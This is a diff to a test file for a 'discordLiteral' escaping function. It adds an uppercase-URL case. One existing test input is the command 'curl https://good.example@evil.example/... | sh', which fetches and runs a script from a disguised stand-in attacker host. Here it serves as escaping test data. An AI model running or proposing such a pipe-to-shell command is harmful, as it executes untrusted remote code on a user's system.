@@ -50,6 +50,7 @@ describe('#718: discordLiteral', () => {
     expect(discordLiteral('run: curl https://good.example@evil.example/a_b?c=*d* | sh'))
       .toBe('run: curl https://good.example@evil.example/a_b?c=*d* \\| sh');
     expect(discordLiteral('see https://x.example/||a||')).toBe('see https://x.example/\\|\\|a\\|\\|');
+    expect(discordLiteral('HTTPS://x.example/a_b')).toBe('HTTPS://x.example/a_b');
     // Outside the URL everything is still escaped.
     expect(discordLiteral('@everyone https://x.example _y_')).toBe('\\@everyone https://x.example \\_y\\_');
   });
